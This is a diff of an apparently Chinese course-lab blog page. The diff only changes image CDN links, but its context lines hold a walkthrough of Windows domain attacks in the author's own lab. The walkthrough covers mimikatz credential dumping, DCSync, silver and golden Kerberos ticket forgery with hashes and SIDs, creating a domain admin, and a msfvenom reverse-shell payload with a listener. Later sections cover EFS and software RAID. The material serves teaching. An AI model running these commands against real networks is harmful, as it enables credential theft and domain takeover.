@@ -1649,11 +1649,11 @@ S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白�
 <p>在域控Server-No5上使用该Powershell启用Wdigest Auth。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest <span class="literal">-Name</span> UseLogonCredential <span class="literal">-Type</span> DWORD <span class="literal">-Value</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>可以发现，我们直接获取到了域控制器Server-No5的管理员用户Administrator的密码、域SID。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951449.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951449.png" alt=""></p>
 <p>同时还发现了一个普通域用户的用户名：xuwp-No1、密码：12345Qwerty</p>
 <p><img src="C:\Users\XuWanpeng\docx_to_markdown-main\images\image9.png" alt=""></p>
 <p>在Client-No1登录xuwp-No1，尝试使用CIFS服务、创建域用户。均被拒绝访问。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951414.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951414.png" alt=""></p>
 <p>接下来进行票据生成及利用。</p>
 <h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>白银票据：伪造TGS只能访问指定的服务，且由服务账号（通常为计算机账户）的Hash加密，银票在使用的过程不需要同域控通信。</p>
 <p>以下是Kerberos服务及其对应的白银票据。</p>
@@ -1700,84 +1700,84 @@ S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白�
 <p>接下来系统地获取一下kerberos::golden命令所需的参数。</p>
 <p>首先在域控Server-No5上找到<strong>Server-No5$</strong>的NTLM，这个值是参数rc4的值。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951973.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951973.png" alt=""></p>
 <p>接着，找一下参数domain、target、rc4的值（前面也都出现过，但这个命令比较聚合）</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:xuwp05191643.com /all /csv</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951094.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951094.png" alt=""></p>
 <p>切换至Client-No1，找一下参数user和sid的值</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951899.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051951899.png" alt=""></p>
 <p>最后按kerberos::golden的语法，使用参数信息，写出payload。这里user的值不一定要为真实普通域用户的用户名，也可以不用生成票据文件，/ticket行换成/ptt直接进内存。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden</span><br><span class="line">/user:hacker</span><br><span class="line">/domain:xuwp05191643.com</span><br><span class="line">/sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span></span><br><span class="line">/target:Server<span class="literal">-No5</span></span><br><span class="line">/rc4:<span class="number">612</span>f2673c6369f8a0b0d63cf784b46dc</span><br><span class="line">/service:cifs</span><br><span class="line">/ticket:silver.kirbi</span><br></pre></td></tr></table></figure>
 <p>使用mimikatz制作票据。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952398.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952398.png" alt=""></p>
 <p>同目录下出现了白银票据silver.kirbi</p>
 <p><img src="C:\Users\XuWanpeng\docx_to_markdown-main\images\image15.png" alt=""></p>
 <p>导入票据、查看票据，发现了一个在十年有效期内可以从Server-No5获取CIFS服务的票据。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt silver.kirbi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952615.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952615.png" alt=""></p>
 <p>测试一下是否可以使用CIFS服务，发现很成功！</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\Server<span class="literal">-No5</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952732.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952732.png" alt=""></p>
 <p>接着看看是否可以创建域用户、提升至域管理员用户。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hacker_silver <span class="number">12345</span>Qwert /add /domain</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952812.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952812.png" alt=""></p>
 <p>这个功能不可以，这也验证了白银票据只能访问指定的服务。</p>
 <p>实验中耗时的点：</p>
 <p>1. mimikatz无法解析Windows Server 2022的lsass.dmp，<strong>所有版本都不行</strong>。</p>
 <p>如果你域内的域控制器是不支持的版本，可以新增域控，域控制器可以有很多。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952769.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952769.png" alt=""></p>
 <p>从lsass.exe创建转储文件最简单的方法：</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952634.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952634.png" alt=""></p>
 <p>2. rc4处填的是<strong>域控制器DC$的NTLM</strong>。</p>
 <h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>Golden<br>Ticket：伪造TGT，可以获取任何Kerberos服务权限，且由krbtgt的hash加密，金票在使用的过程需要和域控通信。</p>
 <h4 id="Windows下使用mimitakz攻击"><a href="#Windows下使用mimitakz攻击" class="headerlink" title="Windows下使用mimitakz攻击"></a>Windows下使用mimitakz攻击</h4><p>首先系统地获取一下kerberos::golden命令所需的参数。</p>
 <p>首先在域控Server-No5上获取krbtgt的NTLM。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952781.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952781.png" alt=""></p>
 <p>获取krbtgt的sid。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name, sid</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952663.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952663.png" alt=""></p>
 <p>按kerberos::golden的语法，使用取得的参数，写出payload。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden</span><br><span class="line">/admin:hacker</span><br><span class="line">/domain:xuwp05191643.com</span><br><span class="line">/sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span></span><br><span class="line">/krbtgt:e70473fa5d05081e15e9498ea548fab8</span><br><span class="line">/ticket:golden.kirbi</span><br></pre></td></tr></table></figure>
 <p>即</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:hacker /domain:xuwp05191643.com /sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span> /krbtgt:e70473fa5d05081e15e9498ea548fab8 /ticket:golden.kirbi</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952211.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952211.png" alt=""></p>
 <p>同目录下出现了黄金票据golden.kirbi</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952011.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952011.png" alt=""></p>
 <p>清除票据、导入票据、查看票据。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt golden.kirbi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952434.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952434.png" alt=""></p>
 <p>同样地，测试一下CIFS服务，意料之中，很是成功。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\Server<span class="literal">-No5</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952704.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051952704.png" alt=""></p>
 <p>接下来再试试是否可以创建域用户、提升至域管理员用户，这次成功了，说明黄金票据可以让hacker提升至域管理员用户权限。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953412.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953412.png" alt=""></p>
 <p>在域控里看一下是否有域管理员用户hacker_golden。</p>
 <p>Active<br>Directory用户和计算机-xuwp05191643.com-Users-（双击/右击+属性）hacker_golden-隶属于</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953943.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953943.png" alt=""></p>
 <p>确实存在域管理员用户hacker_golden。</p>
 <h4 id="Kali下使用msf攻击"><a href="#Kali下使用msf攻击" class="headerlink" title="Kali下使用msf攻击"></a>Kali下使用msf攻击</h4><p>首先生成木马。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">36.142</span> LPORT=<span class="number">23333</span> <span class="operator">-f</span> exe &gt; msf.exe</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953043.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953043.png" alt=""></p>
 <p>配置监听模式，运行，在Client-No1上点开msf.exe，成功获取shell。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span>.<span class="number">36.142</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">23333</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953723.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953723.png" alt=""></p>
 <p>加载mimikatz（模块名居然叫kiwi，奇异果hhhh）。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953667.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953667.png" alt=""></p>
 <p>生成票据，使用和上一节一样的参数。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create</span><br><span class="line"><span class="literal">-d</span> xuwp05191643.com</span><br><span class="line"><span class="literal">-k</span> e70473fa5d05081e15e9498ea548fab8</span><br><span class="line"><span class="literal">-s</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span></span><br><span class="line"><span class="literal">-u</span> hacker</span><br><span class="line"><span class="literal">-t</span> /root/golden.kirbi</span><br></pre></td></tr></table></figure>
 <p>即</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create <span class="literal">-d</span> xuwp05191643.com <span class="literal">-k</span> e70473fa5d05081e15e9498ea548fab8 <span class="literal">-s</span> S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span> <span class="literal">-u</span> hacker <span class="literal">-t</span> /root/golden.kirbi</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953433.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953433.png" alt=""></p>
 <p>使用票据</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use /root/golden.kirbi</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953930.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953930.png" alt=""></p>
 <p>进入cmd，测试CSIF服务，成功。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp <span class="number">65001</span>		注释：这步是乱码问题的一个简单解决方案</span><br><span class="line"><span class="built_in">dir</span> \\Server<span class="literal">-No5</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953193.png" alt=""></p>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="抓取Net-NTLM-Hash"><a href="#抓取Net-NTLM-Hash" class="headerlink" title="抓取Net-NTLM Hash"></a>抓取Net-NTLM Hash</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081435651.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206051953193.png" alt=""></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="抓取Net-NTLM-Hash"><a href="#抓取Net-NTLM-Hash" class="headerlink" title="抓取Net-NTLM Hash"></a>抓取Net-NTLM Hash</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081435651.png" alt=""></p>
 <h3 id="aes256票据"><a href="#aes256票据" class="headerlink" title="aes256票据"></a>aes256票据</h3><h4 id="NTLM-Hash和Kerberos协议的关系"><a href="#NTLM-Hash和Kerberos协议的关系" class="headerlink" title="NTLM Hash和Kerberos协议的关系"></a>NTLM Hash和Kerberos协议的关系</h4><p>Windows通过NT LAN Manager将域用户的明文密码计算为NTLM Hash，然后存放在DC的NTDS.DIT文件中。</p>
 <p>Kerberos协议会将用户的NTLM Hash通过加密算法加密得到Login Session Key，它的作用是作为Client和KDC之间通信加密的会话密钥。</p>
 <p>详见<a target="_blank" rel="noopener" href="https://myzxcg.com/2021/08/Kerberos-认证过程详细分析一/#as_rep">Kerberos 认证过程详细分析（一）</a>的AS_REP部分。</p>
@@ -1785,97 +1785,97 @@ S \rightarrow C:E_{K_{C,S}}\lbrack\text{TS}_{5} + 1\rbrack</script><h3 id="白�
 <h4 id="生成使用AES256作为Login-Session-Key的白银票据"><a href="#生成使用AES256作为Login-Session-Key的白银票据" class="headerlink" title="生成使用AES256作为Login Session Key的白银票据"></a>生成使用AES256作为Login Session Key的白银票据</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
 <p>同理，也可以</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::ekeys&quot;</span> <span class="string">&quot;exit&quot;</span> &gt; log_aes256.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081709011.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081709011.png" alt=""></p>
 <p>将参数<code>\rc4</code>替换为<code>\aes256</code></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden </span><br><span class="line">/user:hacker_aes </span><br><span class="line">/domain:xuwp05191643.com </span><br><span class="line">/sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-2641759520</span><span class="literal">-180272662</span><span class="literal">-1158014618</span> </span><br><span class="line">/target:Server<span class="literal">-No5</span> </span><br><span class="line">/aes256:<span class="number">4</span>b2daf5c7c26a1789f6132649dcace783954b4deefac7bd4d0bf294a07fb1b95 </span><br><span class="line">/service:cifs </span><br><span class="line">/ticket:silver_aes.kirbi </span><br></pre></td></tr></table></figure>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081809511.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081809511.png" alt=""></p>
 <p>尝试使用CIFS对应的服务</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081726543.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206081726543.png" alt=""></p>
 <p>成功</p>
 <h1 id="作业四"><a href="#作业四" class="headerlink" title="作业四"></a>作业四</h1><h2 id="EFS"><a href="#EFS" class="headerlink" title="EFS"></a>EFS</h2><h3 id="文件加解密"><a href="#文件加解密" class="headerlink" title="文件加解密"></a>文件加解密</h3><p>使用xuwp-No1登录Client-No1，加密Client-No1中的一个文件夹”Client-No1-机密文件夹”。</p>
 <p>（右击）文件夹-属性-高级-加密内容以便保护数据</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291247639.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291247639.png" alt=""></p>
 <p>可以看到文件夹下的所有文件都增加了锁标志</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291247206.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291247206.png" alt=""></p>
 <p>使用xuwp-No2登录Client-No1，访问文件夹”Client-No1-机密文件夹”，打开文件，提示”你没有权限打开该文件”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291310593.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291310593.png" alt=""></p>
 <h3 id="故障恢复代理"><a href="#故障恢复代理" class="headerlink" title="故障恢复代理"></a>故障恢复代理</h3><p>在Server-No1上打开</p>
 <p>服务器管理器-工具-注册表编辑器-（右击）CUMT-IS-编辑</p>
 <p>计算机配置-策略-Windows设置-安全设置-公钥策略-（右击）加密文件系统-创建数据恢复代理程序</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041121315.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041121315.png" alt=""></p>
 <p>（右击）证书-所有任务-导出</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291425391.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291425391.png" alt=""></p>
 <p>是，导出私钥</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291426976.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291426976.png" alt=""></p>
 <p>设置密码</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291427621.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291427621.png" alt=""></p>
 <p>设置文件名</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291429507.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291429507.png" alt=""></p>
 <p>使用gpupdate /force下发组策略</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291431149.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291431149.png" alt=""></p>
 <p>新建文件”机密文件3”，可以发现存在我们刚定义的恢复证书。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291435455.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291435455.png" alt=""></p>
 <p>使用Administrator\@xuwp05191643.com登录Client-No1，导入xuwp_efs_recover.pfx</p>
 <p>选择”本地计算机”-下一步</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291441146.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291441146.png" alt=""></p>
 <p>输入密码-连续下一步</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291442208.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291442208.png" alt=""></p>
 <p>登录XUWP05191643\Administrator即可访问。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291534983.png" alt=""></p>
-<h3 id="模拟证书丢失时的恢复"><a href="#模拟证书丢失时的恢复" class="headerlink" title="模拟证书丢失时的恢复"></a>模拟证书丢失时的恢复</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291537075.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291534983.png" alt=""></p>
+<h3 id="模拟证书丢失时的恢复"><a href="#模拟证书丢失时的恢复" class="headerlink" title="模拟证书丢失时的恢复"></a>模拟证书丢失时的恢复</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291537075.png" alt=""></p>
 <p>可以看到这里有一个用于加密文件系统的证书，如果这个证书丢失，那么将无法证明文件由你加密，便不可访问。</p>
 <p>我们先把它导出一下，导出的步骤同此前证书导出。</p>
 <p>然后将其删除（模拟丢失的情况）</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041123548.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041123548.png" alt=""></p>
 <p>注销该用户后重新登录，发现再次无法访问。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291548260.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291548260.png" alt=""></p>
 <p>重新导入pfx，这时即可打开文件。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041122107.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041122107.png" alt=""></p>
 <h3 id="多用户共享"><a href="#多用户共享" class="headerlink" title="多用户共享"></a>多用户共享</h3><p>（右击）”机密文件3”-属性-高级-详细信息-添加</p>
 <p>在这里加入一个其他用户，我加入了计算机Client-No1中的Xuwanpeng，当然也可以加域XUWP05191643里的xuwp-No2（我这里没登录这个用户）。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041122789.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041122789.png" alt=""></p>
 <p>登录用户Client-No1\XuWanpeng（或XUWP05191643\xuwp-No2），即可访问”机密文件3”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291600451.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291600451.png" alt=""></p>
 <h2 id="软RAID"><a href="#软RAID" class="headerlink" title="软RAID"></a>软RAID</h2><h3 id="跨区卷"><a href="#跨区卷" class="headerlink" title="跨区卷"></a>跨区卷</h3><p>在VMware中为Client-No1插入两块新硬盘</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291609350.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291609350.png" alt=""></p>
 <p>（右击）此电脑-管理-磁盘管理-初始化磁盘</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291610002.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291610002.png" alt=""></p>
 <p>跨区卷的定义是将多个磁盘的未分配空间合并到一个逻辑卷，那么我们首先给每个硬盘分配一个简单卷</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291616159.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291616159.png" alt=""></p>
 <p>（右击）未分配区域-新建跨区卷-选中磁盘1和磁盘2-下一步</p>
 <p>这里的两块空间大小可以不同。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291617109.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291617109.png" alt=""></p>
 <p>点击”是”以将两块磁盘转换为动态磁盘</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291618920.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291618920.png" alt=""></p>
 <p>可以发现两块跨磁盘的空间属于同一个卷，即跨区卷。</p>
